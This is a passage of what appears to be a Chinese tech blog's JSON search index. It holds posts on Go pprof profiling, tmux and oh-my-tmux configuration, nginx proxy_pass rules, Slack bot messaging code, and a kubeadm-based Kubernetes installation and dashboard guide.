0.038+0.23/0/0+0.003 ms cpu, 28->28->24 MB, 29 MB goal, 1 P\ngc 5 @6.223s 0%: 0.023+26+0.002 ms clock, 0.023+0/0.23/0+0.002 ms cpu, 56->56->48 MB, 57 MB goal, 1 P\ngc 6 @6.251s 0%: 0.038+47+0.003 ms clock, 0.038+0/0.25/0+0.003 ms cpu, 112->112->96 MB, 113 MB goal, 1 P\ngc 7 @6.301s 0%: 0.051+93+0.003 ms clock, 0.051+0/0.24/0+0.003 ms cpu, 224->224->192 MB, 225 MB goal, 1 P\ngc 8 @6.407s 0%: 0.023+192+0.004 ms clock, 0.023+0/0.28/0+0.004 ms cpu, 448->448->384 MB, 449 MB goal, 1 P\ngc 9 @6.631s 0%: 0.053+397+0.003 ms clock, 0.053+0/0.25/0+0.003 ms cpu, 896->896->768 MB, 897 MB goal, 1 P\ngc 10 @7.080s 0%: 0.052+1205+0.003 ms clock, 0.052+0/0.24/0+0.003 ms cpu, 1792->1792->1536 MB, 1793 MB goal, 1 P\n\n\n可以看到，GC 差不多每 3 秒就发生一次，且每次 GC 都会从 16MB 清理到几乎 0MB，说明程序在不断的申请内存再释放，这是高性能 golang 程序所不允许的。\n\n所以接下来使用 pprof 排查时，我们在乎的不是什么地方在占用大量内存，而是什么地方在不停地申请内存，这两者是有区别的。\n\n#由于内存的申请与释放频度是需要一段时间来统计的，所有我们保证炸弹程序已经运行了几分钟之后，再运行命令：\ngo tool pprof http://localhost:6060/debug/pprof/allocs\n\n# top\n(pprof) top\nShowing nodes accounting for 16MB, 100% of 16MB total\n      flat  flat%   sum%        cum   cum%\n      16MB   100%   100%       16MB   100%  github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Run (inline)\n         0     0%   100%       16MB   100%  github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Live\n         0     0%   100%       16MB   100%  main.main\n         0     0%   100%       16MB   100%  runtime.main\n         \n# list Run         \n(pprof) list Run\nTotal: 16MB\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Run in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/canidae/dog/dog.go\n      16MB       16MB (flat, cum)   100% of Total\n         .          .     38:   log.Println(d.Name(), \"pee\")\n         .          .     39:}\n         .          .     40:\n         .          .     41:func (d *Dog) Run() {\n         .          .     42:   log.Println(d.Name(), \"run\")\n      16MB       16MB     43:   _ = make([]byte, 16 * constant.Mi)\n         .          .     44:}\n         .          .     45:\n         .          .     46:func (d *Dog) Howl() {\n         .          .     47:   log.Println(d.Name(), \"howl\")\n         .          .     48:}\n         \n         \n可以看到 github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Run 会进行无意义的内存申请，而这个函数又会被频繁调用，这才导致程序不停地进行 GC\n```\n\n![1](pprof排查golang问题/3.png)\n\n### 3.4 排查协程泄露\n\n```bash\ngo tool pprof http://localhost:6060/debug/pprof/goroutine\n\n# top 查看\n(pprof) top\nShowing nodes accounting for 14, 100% of 14 total\nShowing top 10 nodes out of 27\n      flat  flat%   sum%        cum   cum%\n        12 85.71% 85.71%         12 85.71%  runtime.gopark\n         1  7.14% 92.86%          1  7.14%  net/http.(*connReader).backgroundRead\n         1  7.14%   100%          1  7.14%  runtime/pprof.writeRuntimeProfile\n         0     0%   100%         10 71.43%  github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Drink.func1\n         0     0%   100%          1  7.14%  internal/poll.(*FD).Accept\n         0     0%   100%          1  7.14%  internal/poll.(*pollDesc).wait\n         0     0%   100%          1  7.14%  internal/poll.(*pollDesc).waitRead (inline)\n         0     0%   100%          1  7.14%  internal/poll.runtime_pollWait\n         0     0%   100%          1  7.14%  main.main\n         0     0%   100%          1  7.14%  main.main.func1\n\n# list 函数\n(pprof) list Drink\nTotal: 14\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Drink.func1 in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/canidae/wolf/wolf.go\n         0         10 (flat, cum) 71.43% of Total\n         .          .     29:\n         .          .     30:func (w *Wolf) Drink() {\n         .          .     31:   log.Println(w.Name(), \"drink\")\n         .          .     32:   for i := 0; i < 10; i++ {\n         .          .     33:           go func() {\n         .         10     34:                   time.Sleep(30 * time.Second)\n         .          .     35:           }()\n         .          .     36:   }\n         .          .     37:}\n         .          .     38:\n         .          .     39:func (w *Wolf) Shit() {\n         \n可以看到，Drink 函数每次回释放 10 个协程出去，每个协程会睡眠 30 秒再退出，而 Drink 函数又会被反复调用，这才导致大量协程泄露，试想一下，如果释放出的协程会永久阻塞，那么泄露的协程数便会持续增加，内存的占用也会持续增加，那迟早是会被操作系统杀死的。         \n```\n\n![1](pprof排查golang问题/4.png)\n\n### 3.5 排查锁的争用\n\n```bash\ngo tool pprof http://localhost:6060/debug/pprof/mutex\n\n\n# top 查看\n(pprof) top\nShowing nodes accounting for 1s, 100% of 1s total\n      flat  flat%   sum%        cum   cum%\n        1s   100%   100%         1s   100%  sync.(*Mutex).Unlock (inline)\n         0     0%   100%         1s   100%  github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Howl.func1\n         \n# list 函数       \n(pprof) list Howl\nTotal: 1s\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Howl.func1 in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/canidae/wolf/wolf.go\n         0         1s (flat, cum)   100% of Total\n         .          .     53:\n         .          .     54:   m := &sync.Mutex{}\n         .          .     55:   m.Lock()\n         .          .     56:   go func() {\n         .          .     57:           time.Sleep(time.Second)\n         .         1s     58:           m.Unlock()\n         .          .     59:   }()\n         .          .     60:   m.Lock()\n         .          .     61:}\n         \n这个锁由主协程 Lock，并启动子协程去 Unlock，主协程会阻塞在第二次 Lock 这儿等待子协程完成任务，但由于子协程足足睡眠了一秒，导致主协程等待这个锁释放足足等了一秒钟。         \n```\n\n![1](pprof排查golang问题/5.png)\n\n### 3.6 排查阻塞操作\n\n```bash\ngo tool pprof http://localhost:6060/debug/pprof/block\n\n# top list web 大法\n```\n\n\n\n# 4. 火焰图\n\n```bash\n# 在上面例子中\ngo tool pprof -seconds 10 http://127.0.0.1:6060/debug/pprof/profile\n\ngo tool pprof -http=:8081 ~/pprof/pprof.samples.cpu.002.pb.gz\n\n# 可以在页面中 view->flamegraph 查看火焰图\nhttp://localhost:8081/ui/flamegraph\n```\n\n![1](pprof排查golang问题/6.png)\n\n\n\n# 5. 参考资料\n\n+ https://golang.org/pkg/net/http/pprof/\n+ https://blog.wolfogre.com/posts/go-ppof-practice/\n\n","tags":["golang"],"categories":["3_golang杂项"]},{"title":"iterm2上tmux和oh_my_tmux的使用","url":"%2Fp%2F29f1e79c.html","content":"\ntmux是一款优秀的终端复用软件，它比Screen更加强大。 tmux之所以受人们喜爱，主要得益于以下功能：\n\n- 丝滑分屏（split），虽然iTem2也提供了横向和竖向分屏功能，但这种分屏功能非常拙劣，完全等同于屏幕新开一个窗口，新开的pane不会自动进入到当前目录，也没有记住当前登录状态。这意味着如果我ssh进入到远程服务器时，iTem2新开的pane中，我依然要重新走一遍ssh登录的老路（omg）。tmux就不会这样，tmux窗口中，新开的pane，默认进入到之前的路径，如果是ssh连接，登录状态也依旧保持着，如此一来，我就可以随意的增删pane，这种灵活性，好处不言而喻。\n\n- 保护现场（attach），即使命令行的工作只进行到一半，关闭终端后还可以重新进入到操作现场，继续工作。对于ssh远程连接而言，即使网络不稳定也没有关系，掉线后重新连接，可以直奔现场，之前运行中的任务，依旧在跑，就好像从来没有离开过一样；特别是在远程服务器上运行耗时的任务，tmux可以帮你一直保持住会话。如此一来，你就可以随时随地放心地进行移动办公，只要你附近的计算机装有tmux（没有你也可以花几分钟装一个），你就能继续刚才的工作。\n\n<!-- more -->\n\n+ 先上效果图\n\n![1](iterm2上tmux和oh_my_tmux的使用/1.png)\n\n![1](iterm2上tmux和oh_my_tmux的使用/2.png)\n\n\n\n# 1. 安装\n\n### 1.1 tmux 安装\n\n```bash\nbrew install tmux #mac\n\napt-get install tmux #linux\n```\n\n\n\n### 1.2 oh my tmux 安装\n\n+ https://github.com/gpakosz/.tmux\n\n```bash\ncd\ngit clone https://github.com/gpakosz/.tmux.git\nln -s -f .tmux/.tmux.conf\ncp .tmux/.tmux.conf.local .\n```\n\n以后配置修改   ~/.tmux.conf.local 即可. \n\n\n\n# 2. tmux 使用\n\ntmux使用C/S模型构建，主要包括以下单元模块：\n\n- server服务器。输入tmux命令时就开启了一个服务器。\n- session会话。一个服务器可以包含多个会话\n- window窗口。一个会话可以包含多个窗口。\n- pane面板。一个窗口可以包含多个面板。\n\n我习惯一个项目用一个 session, 一个工作区用一个 window, 快捷操作开始一个 panel. 如果刚开始记不住 tmux的操作, 一定多练习, 一定多用, 你会发现离不开它了.\n\n\n\n### 2.1 tmux 命令\n\n```bash\ntmux ls # 查看当前所有的session\n\ntmux\t# 新建一个无名称的会话, 可以用$再改名\n\ntmux new -s demo # 新建一个名称为demo的会话, \n\ntmux attach -t session_name # 连接之前退出的session\n\ntmux attach-session  # 快速进入 session\n\ntmux kill-server  #关闭服务器，所有的会话都将关闭\n```\n\n\n\n### 2.2 session操作\n\n+ 新建 <prefix> C-c\n\n+ 删除  :kill-session  或  tmux ls 以后 tmux kill-session -t 名字\n\n+ 选择 s\n\n+ 重命名 $\n\n+ 退出  d\n\n\n\n### 2.3 window 操作\n\n+ 新建   c\n+ 关闭  ctrl+d 或   &\n+ 列表  w   可切到其他 session\n\n+ 重命名  ,\n\n+ 跳跃  0-9\n+ 向左 C-h  或   n\n+ 向右 C-l  或   p\n\n\n\n### 2.4 panel 操作\n\n+ 新建上下   - 或  \"\n\n+ 新建左右   _  或 %\n\n+ 关闭  ctrl+d  或 x\n\n+ 切换： 空格键\n\n+ 移动    hjkl 键 或 上下左右键\n\n+ 最大化  z\n\n+ 变窗口  !   如果只是临时变 window, 用+\n\n\n\n### 2.5 Oh My Tmux 操作\n\n```bash\n#自动把 ctrl + a 当做第二个前缀\n\n<prefix> m #切换鼠标开启状态\n\n<prefix> e #自动打开配置\n\n<prefix> r # 刷新配置\n\n<prefix> C-c  #新建一个 Session\n\n<prefix> - 和 <prefix> _  #水平和垂直分屏\n\n<prefix> + #让当前 panel 成为 window, 注意 再一次还能回到 panel\n```\n\n\n\n### 2.6 tmux 复制模式\n\n```bash\nvi ~/.tmux.conf.local\n\n# 打开下面的配置\nset -g mode-keys vi\n```\n\n例如我的控制键为：C-a\n\n1、 C-a [ 进入复制模式\n\n2、 参考上表移动鼠标到要复制的区域，移动鼠标时可用vim的搜索功能\"/\",\"?\"\n\n3、 空格键开始选择复制区域\n\n4、 选择完成后安enter键退出\n\n5、 C-a ] 粘贴\n\n如果用iterm2, 建议直接使用它的复制模式, 但用vi的搜索等操作还是很实用的\n\n\n\n# 3. 配置\n\n### 3.1 tmux 配置\n\n```bash\ntmux source-file ~/.tmux.conf # 刷新配置\n\nset-option -g prefix2 `  # 设置一个不常用的`键作为指令前缀，按键更快些, 建议用 ctrl+a\n\nset -g mouse on  # 最好关掉, 要不然影响iterm2自带鼠标选中\n```\n\n\n\n### 3.2 tmux 插件\n\n+ tpm 插件管理\n\n  ```bash\n  git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm\n  ```\n\n  配置参考:\n\n  ```bash\n  set -g @tpm_plugins '          \\\n    tmux-plugins/tpm             \\\n  '\n  run '~/.tmux/plugins/tpm/tpm'\n  ```\n  \n  安装:\n  \n  ```bash\n  Installing plugins\n  1. Add new plugin to ~/.tmux.conf with set -g @plugin '...'\n  ```\n2. Press prefix + I (capital i, as in Install) to fetch the plugin.\n\nYou're good to go! The plugin was cloned to ~/.tmux/plugins/ dir and sourced.\n  ```\n\n+ tmux-resurrect 保存session\n\n  ```bash\n  <prefix> ctrl + s #save\n  <prefix> ctrl + r #load\n  ```\n\n\n\n### 3.3 修改Oh My Tmux 配置\n\n  ```bash\n  tmux_conf_new_window_retain_current_path=true  #window保持路径\n  tmux_conf_new_pane_reconnect_ssh=true  #重新连接 ssh\n  tmux_conf_new_session_prompt=true  #新建 session 输入名字\n\n  #左边状态栏精简\n  tmux_conf_theme_status_left=' ❐ #S '  \n  \n  # 右边显示天气, 和week of year\n  tmux_conf_theme_status_right='#{prefix}#{pairing}#{synchronized} | #(ipconfig getifaddr en0) | week-#(date +%V)'\n  \n  # 前缀显示 emoji\n  tmux_conf_theme_prefix='🍎 🍐 🍊 🍋 🍌 🍉 '\n \n  # 复制模式 vi\n  set -g mode-keys vi\n  \n  # 状态栏放到上面\n  set -g status-position top\n\n------------------------------------------------------------------\n\n  # Ctrl+Shift+Left  window向左(不需要prefix), Ctrl+Shift+Left window向右(不需要prefix)\n  #bind-key -n C-S-Left swap-window -t -1 \n  #bind-key -n C-S-Right swap-window -t +1 \n  #链接: https://superuser.com/a/552493\n  bind-key -n C-S-Left swap-window -t -1\\; select-window -t -1\n  bind-key -n C-S-Right swap-window -t +1\\; select-window -t +1\n\n  # 插件相关, 参考3.2安装插件步骤\n  set -g status-right 'Continuum status: #{continuum_status}'\n  set -g @continuum-save-interval '10'\n  set -g @continuum-restore 'on'\n\n  set -g @tpm_plugins '    \\\n  tmux-plugins/tpm            \\\n  tmux-plugins/tmux-open \\\n  tmux-plugins/tmux-yank\t\\\n  tmux-plugins/tmux-sensible  \\\n  tmux-plugins/tmux-resurrect  \\\n  tmux-plugins/tmux-continuum  \\\n  '\n  run '~/.tmux/plugins/tpm/tpm'\n  ```\n\n  \n\n# 4. tmux 遇到的问题\n\n### 4.1 off, 鼠标无法滚动\n\nIn iTerm2 all you need to do is to go to \n\nPreferences > Profile > Terminal and check ‘Save lines to scrollback when an app status bar is present’.\n\n### 4.2 on, 鼠标无法智能选中\n\n快速关闭, prefix+m\n\n### 4.3 无论off, on  鼠标点击文件不是默认 app 打开\n\nhttps://stackoverflow.com/a/56715244/7062454\n\n自己强答一题: 先退出 tmux seesion, 用鼠标点击通过默认 app 打开, 再进入 tmux session 就可以了\n\n### 4.4 鼠标无法滚动\n\n+ 重置iterm2\n\n  删除app后, 清理一下配置\n\n  ```bash\n  rm ~/Library/Application\\ Support/iTerm2\n  rm ~/Library/Preferences/com.googlecode.iterm2.*\n  ```\n\n+ 重置 oh my tmux\n\n  ```bash\n  #出问题, 大概率.tmux.conf.local\n  ```\n\n\n\n# 5. 参考资料\n\n+ http://louiszhai.github.io/2017/09/30/tmux/\n\n","tags":["iterm2"],"categories":["tmux"]},{"title":"nginx常见proxy_pass规则","url":"%2Fp%2F55856485.html","content":"\n# 1. 有无 / 结尾\n\n在location中匹配的url最后有无/结尾，指的是模糊匹配与精确匹配的问题\n在proxy_pass中代理的url最后有无/结尾，指的是在proxy_pass 指定的url后要不要加上location匹配的url的问题\n\n### 1.1 localtion 加不加 /\n\n+ location /abc/def  \n\n  可以匹配/abc/defghi的请求，也可以匹配/abc/def/ghi ......\n\n+ location /abc/def/  \n\n  不能匹配/abc/defghi的请求，只能精确匹配 /abc/def/ghi这样的请求\n\n<!-- more -->\n\n### 1.2 proxy_pass 加不加/\n\n```nginx\nlocation /star/ {\n\tproxy_pass http://ent.163.com;\n}\n\n#如果是location /star/，http://abc.163.com/star/1.html ==> http://ent.163.com/star/1.html。\n#如果是location /blog/，http://abc.163.com/blog/1.html ==> http://ent.163.com/blog/1.html。\n```\n\nlocation是什么，nginx 就把location 加在proxy_pass 的 server 后面 。\n\n\n\n```nginx\nlocation /star/ {\n\tproxy_pass http://ent.163.com/;\n}\n\n#如果是location /star/, \thttp://abc.163.com/star/1.html ==> http://ent.163.com/1.html。\n#如果是location /blog/,  http://abc.163.com/blog/1.html ==> http://ent.163.com/1.html。\n```\n\n\n改变location，并不能改变返回的内容，返回的内容始终是http://ent.163.com/ 。\n\n\n\n\n# 2. 匹配并转发参数\n\n需求是 `/api/camps/v1/teacher`   -> 其他服务器  `/api/v1/teacher `, 并且转发参数\n\n```nginx\nlocation ~ ^/api/camps/v1/(.*)$ {\n            include /etc/nginx/proxy_params;\n            proxy_pass http://127.0.0.1:9082/api/v1/$1$is_args$args;\n  }\n```\n\n\n\n# 3. 代理相对路径\n\n### 3.1 完全转发\n\n```nginx\nserver {\n        listen 80 default_server;\n        listen [::]:80 default_server;\n        location / {\n                proxy_pass https://www.liuvv.com/;\n        }\n\n}\n```\n\nhttp://159.75.75.191/  此时是完全代理的\n\n### 3.2 二级转发\n\n```nginx\nserver {\n        listen 80 default_server;\n        listen [::]:80 default_server;\n        location /liuvv/ {\n                proxy_pass https://www.liuvv.com/;\n        }\n}\n```\n\nhttp://159.75.75.191/liuvv/  此时一些子url 是404, 因为直接打到了 `/` 路径\n\n##### 3.2.1 方案一\n\n```nginx\nserver {\n        listen 80 default_server;\n        listen [::]:80 default_server;\n        location /liuvv/ {\n                proxy_pass https://www.liuvv.com/;\n        }\n\t       location / {\n               proxy_pass https://www.liuvv.com/;\n       }\n}\n```\n\n##### 3.2.1 方案二\n\n```nginx\nserver {\n        listen 80 default_server;\n        listen [::]:80 default_server;\n        location ^~ /liuvv/ {\n        \tproxy_pass https://www.liuvv.com/;\n        }\n        location ~ ^/([A-Za-z0-9]+) {\n        \tproxy_pass https://www.liuvv.com;\n        }\n        location / {\n    \t\t\treturn 403;\n        }\n}\n```\n\n\n\n# 4. 参考资料\n\n+ https://stackoverflow.com/a/8130872/7062454\n+ https://serverfault.com/a/932636\n+ https://www.liuvv.com/p/51e59d76.html\n","tags":["nginx"],"categories":["nginx"]},{"title":"slack介绍和机器人使用","url":"%2Fp%2F68f05de.html","content":"\n经常用的 bearychat 凉了(估计受疫情影响),  还有国内的瀑布IM也凉了, 不得不选用一个新的企业协作工具.\n\n那么在国内为什么不选用钉钉, 飞书, 企业微信? 哈哈哈你懂的. slack 是谁? 算是前面的标杆\n\n<!-- more -->\n\n# 1. 使用\n\n### 1.1  机器人安装\n\n注意先不要用官网最新的教程, 有坑!!!!  看这个 https://github.com/slackapi/hubot-slack/issues/584#issuecomment-611808704\n\n+ Create a classic app from https://api.slack.com/apps?new_classic_app=1\n+ Go to **Features** > **OAuth & Permissions** > **Scopes**\n  + Click \"Add an OAuth Scope\"\n  + Search \"bot\" and choose it\n+ Go to **Features** > **App Home**\n  + Click \"Add Legacy Bot User\"\n  + Input \"Display Name\" and \"Default username\"\n  + Click \"Add\"\n+ Go to **Settings** > **Install App**\n  + Click \"Install App to Workspace\"\n  + Complete the OAuth flow\n\n\n\n### 1.2 字段说明\n\n+ token\n\n  https://api.slack.com/apps?new_classic_app=1  \n\n  1. 点击 app 进去\n\n  2. Features > OAuth & Permissions\n\n     看到 User OAuth Token && Bot User OAuth Token\n\n+ teamid 和 channelId\n\n  以一个地址为例:  https://app.slack.com/client/T01PHQ4J7K/C01PL8L0Y65\n\n  T 开头的是 teamID\n\n  C 开头的是 channleID\n\n\n\n# 2. 机器人发送信息\n\n+ 不建议使用 web hookapi, 因为 channel 过多的时候会很累, 并且功能也少\n\n+ 注意 token 是机器人的 token, 即`Bot User OAuth Token`\n\n+ 注意需要把bot 拉入channel 里, `/invite @BOT_NAME`\n\n### 2.1 golang 代码\n\n+ https://github.com/slack-go/slack/blob/master/examples/messages/messages.go\n\n\n``` go\npackage main\n\nimport (\n\t\"fmt\"\n\n\t\"github.com/slack-go/slack\"\n)\n\nfunc main() {\n\tapi := slack.New(\"YOUR_TOKEN_HERE\")\n\n\tattachment := slack.Attachment{\n\t\tPretext: \"some pretext\",\n\t\tText:    \"some text\",\n\t\t// Uncomment the following part to send a field too\n\t\t/*\n\t\t\tFields: []slack.AttachmentField{\n\t\t\t\tslack.AttachmentField{\n\t\t\t\t\tTitle: \"a\",\n\t\t\t\t\tValue: \"no\",\n\t\t\t\t},\n\t\t\t},\n\t\t*/\n\t}\n\n\tchannelID, timestamp, err := api.PostMessage(\n\t\t\"CHANNEL_ID\",\n\t\tslack.MsgOptionText(\"Some text\", false),\n\t\tslack.MsgOptionAttachments(attachment),\n\t\tslack.MsgOptionAsUser(true), // Add this if you want that the bot would post message as a user, otherwise it will send response using the default slackbot\n\t)\n\tif err != nil {\n\t\tfmt.Printf(\"%s\\n\", err)\n\t\treturn\n\t}\n\tfmt.Printf(\"Message successfully sent to channel %s at %s\", channelID, timestamp)\n}\n```\n\n### 2.2 python 代码\n\npip3 install slack_sdk\n\n+ https://github.com/slackapi/python-slack-sdk#sending-a-message-to-slack\n\n```python\nimport os\nfrom slack_sdk import WebClient\nfrom slack_sdk.errors import SlackApiError\n\nclient = WebClient(token=os.environ['SLACK_BOT_TOKEN'])\n\ntry:\n    response = client.chat_postMessage(channel='#random', text=\"Hello world!\")\n    assert response[\"message\"][\"text\"] == \"Hello world!\"\nexcept SlackApiError as e:\n    # You will get a SlackApiError if \"ok\" is False\n    assert e.response[\"ok\"] is False\n    assert e.response[\"error\"]  # str like 'invalid_auth', 'channel_not_found'\n    print(f\"Got an error: {e.response['error']}\")\n```\n\n\n\n\n\n# 3. app 使用\n\n### 3.1 订阅github提交记录\n\n+ 安装 github app\n\n+ 订阅 github 仓库信息\n  \n+ https://github.com/integrations/slack/issues/625#issuecomment-405638707\n  \n  ```bash\n  /github subscribe unix2dos/unix2dos.github.io commits:all\n  ```\n\n![image-20210228005233393](slack%E4%BB%8B%E7%BB%8D%E5%92%8C%E6%9C%BA%E5%99%A8%E4%BA%BA%E4%BD%BF%E7%94%A8/image-20210228005233393.png)\n\n\n\n# 4. 参考资料\n\n+ https://github.com/slackapi/hubot-slack/issues/584 创建机器人\n+ https://github.com/slack-go/slack\n+ https://github.com/slackapi/python-slack-sdk\n+ https://stackoverflow.com/a/40408813/7062454\n","tags":["slack"],"categories":["使用软件"]},{"title":"k8s的安装和使用","url":"%2Fp%2Fcaa8b60.html","content":"\n# 1. 安装\n\n### 1.1 安装前要求\n\nMaster服务器要2GB RAM 和 2个 CPU, docker和 k8s 在 master 和 node 节点都需要安装.\n\n<!-- more -->\n\n### 1.2 安装docker\n\n```bash\napt update\napt install docker.io\n```\n\n### 1.3 安装k8s\n\n```bash\n# ubuntu 安装\ncurl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add -\n\ncat <<EOF | sudo tee /etc/apt/sources.list.d/kubernetes.list\ndeb https://apt.kubernetes.io/ kubernetes-xenial main\nEOF\n\napt update\napt install -y kubelet kubeadm kubectl\n\n\n# centos 安装\ncat <<EOF > /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=Kubernetes\nbaseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64\nenabled=1\ngpgcheck=0\nrepo_gpgcheck=0\ngpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\nEOF\n\nyum install -y kubelet kubeadm kubectl\n```\n\n修改网络配置\n\n```bash\ncat <<EOF > /etc/sysctl.d/k8s.conf\nnet.bridge.bridge-nf-call-ip6tables = 1\nnet.bridge.bridge-nf-call-iptables = 1\nEOF\n\nsysctl --system\n```\n\n禁止 swap\n\n```bash\nswapoff -a\n```\n\n\n\n# 2. 操作\n\n### 2.1 kubeadm 创建\n\n```bash\nkubeadm init\n\n# 显示下面就是成功了\nYour Kubernetes control-plane has initialized successfully!\nkubeadm join 10.128.0.2:6443 --token essacx.dirj093suimneobu \\\n    --discovery-token-ca-cert-hash sha256:ccfba722f83313d31e27249300501ea88ef0560d7674b7a063fca5b2a3db357c\n```\n\n如果安装过程出现问题, 重置\n\n```bash\nkubeadm reset\nsystemctl stop kubelet\nsystemctl stop docker\nrm -rf /var/lib/cni/\nrm -rf /var/lib/calico/\nrm -rf /var/lib/kubelet/*\nrm -rf /etc/cni/\n\nsystemctl start docker\nsystemctl start kubelet\nkubeadm init\n```\n\n\n\n### 2.2 获取 node 信息\n\n```bash\nkubectl get nodes -o wide\n# 报错\nerror: no configuration has been provided, try setting KUBERNETES_MASTER environment variable\n\n# 非 root用户\nmkdir -p HOME/.kube\nsudo cp -i /etc/kubernetes/admin.conf HOME/.kube/config\nsudo chown (id -u):(id -g) $HOME/.kube/config\n\n#root 用户\nexport KUBECONFIG=/etc/kubernetes/admin.conf\n```\n\n再次获取可看到状态\n\n```bash\nkubectl get nodes # 此处的NotReady是因为网络还没配置.\nNAME   STATUS     ROLES    AGE   VERSION\nus     NotReady   master   10m   v1.18.2\n```\n\n\n\n### 2.3 配置网络\n\n选一个即可\n\n+ 安装Calico\n\n```bash\nwget https://docs.projectcalico.org/v3.11/manifests/calico.yaml\n\n\n# calico.yaml 文件添加以下二行\n- name: IP_AUTODETECTION_METHOD\n\tvalue: \"interface=ens.*\"  # ens 根据实际网卡开头配置\n\n\nkubectl delete -f calico.yaml\nkubectl apply -f calico.yaml\n```\n\n+ 安装 flannel\n\n```bash\nwget https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml\n\nkubectl delete -f kube-flannel.yml\nkubectl apply -f kube-flannel.yml\n```\n\n\n\n### 2.4 添加Worker节点\n\n```bash\n# 获取 nodes\nkubectl get nodes -o wide\n\n# 删除 nodes\nkubectl delete nodes tencent\n\n# 在被删除的node节点清空集群信息\nkubeadm reset\n\n# 在master节点查看集群的token值(在 master 机器操作)\nkubeadm token create --print-join-command\n\n# 将node节点重新添加到k8s集群中(在 node 机器操作)\nkubeadm join 10.128.0.2:6443 --token oa5h63.wylpy4upqzp5nxl4     --discovery-token-ca-cert-hash sha256:182bf7a949b7cad1511df0b38e340dde0196084522132ab6a32da1ae9e4c9d1a\n```\n\n\n\n# 3. 应用部署\n\n### 3.1 nginx\n\n```bash\nvi nginx-pod.yaml\n\napiVersion: v1      # 描述文件所遵循KubernetesAPI的版本\nkind: Pod           # 描述的类型是pod\nmetadata:\n  name: nginx-pod   # pod的名称\n  labels:           # 标签\n    app: nginx-pod\n    env: test\nspec:\n  containers:\n    - name: nginx-pod     # 容器名\n      image: nginx:1.15   # 镜像名称及版本\n      imagePullPolicy: IfNotPresent   # 如果本地不存在就去远程仓库拉取\n      ports:\n        - containerPort: 80   # pod对外端口\n  restartPolicy: Always\n```\n应用和删除\n```bash\nkubectl apply -f nginx-pod.yaml  # 应用\nkubectl delete -f nginx-pod.yaml # 删除\n```\n\n注意, nginx 是在 node 节点上面运行的, 而不是 master, 可以通过 docker ps 查看\n\n\n\n+ 访问nginx\n\n  想要访问到pod中的服务, 最简单的方式就是通过端口转发, 执行如下命令, 将宿主机的`9999`端口与nginx-pod的`80`端口绑定:\n\n  ```bash\n  kubectl port-forward --address 0.0.0.0 nginx-pod 9999:80\n  ```\n\n  然后在 master 身上访问\n\n  ```bash\n  curl localhost:9999\n  ```\n\n  \n\n\n\n# 4. 部署图形界面\n\n### 4.1 下载\n\n  https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/\n\n```bash\nkubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0/aio/deploy/recommended.yaml\n\nkubectl get pods --all-namespaces \n# 部署完毕后, 执行可以看到有 dashboard\n```\n\n\n\n### 4.2 创建用户\n\n+ vi dashboard-adminuser.yaml\n\n  按照下面的去写, 否则可能有权限问题\n\n```bash\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: admin-user\n  namespace: kube-system\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: admin-user\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: cluster-admin\nsubjects:\n- kind: ServiceAccount\n  name: admin-user\n  namespace: kube-system\n```\n\n\n\n```bash\nkubectl apply -f dashboard-adminuser.yaml\n# 显示 clusterrolebinding.rbac.authorization.k8s.io/admin-user created\n```\n\n\n\n### 8.3 访问dashboard\n\nhttps://34.66.187.249:6443/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy\n\n报错  \"message\": \"services \\\"https:kubernetes-dashboard:\\\" is forbidden: User \\\"system:anonymous\\\" cannot get resource \\\"services/proxy\\\" in API group \\\"\\\" in the namespace \\\"kubernetes-dashboard\\\"\",\n\n\n这个是因为kubernetes基于安全性的考虑，浏览器必须要一个根证书，防止中间人攻击\n\n```bash\n# 生成crt\ngrep 'client-certificate-data' /etc/kubernetes/admin.conf | head -n 1 | awk '{print $2}' | base64 -d >> kubecfg.crt\n\n# 生成key文件\ngrep 'client-key-data' /etc/kubernetes/admin.conf | head -n 1 | awk '{print $2}' | base64 -d >> kubecfg.key\n\n# 生成p12证书文件（证书的生成和导入需要一个密码, 建议输入密码）\nopenssl pkcs12 -export -clcerts -inkey kubecfg.key -in kubecfg.crt -out kubecfg.p12 -name \"kubernetes-client\"\n```\n\n\n\nkubecfg.p12即需要导入客户端机器的证书. 将证书拷贝到客户端机器上(自己的电脑), 导入即可(登录钥匙链并且始终信任). \n再次登录时会提示选择证书, 确认后会提示输入当前用户名密码(注意是电脑的用户名密码)\n\n```bash\n# 执行, 复制 token 到浏览器即可\nkubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin-user | awk '{print $1}')\n```\n\n\n\n# 5. 错误问题总结\n\n### 5.1 如何停止 kube-schedule\n\n```bash\nsystemctl stop kubelet\n```\n\n### 5.2 dashboard无法查看的问题\n\nnodes is forbidden: User \"system:serviceaccount:kubernetes-dashboard:kubernetes-dashboard\" cannot list resource \"nodes\" in API group \"\" at the cluster 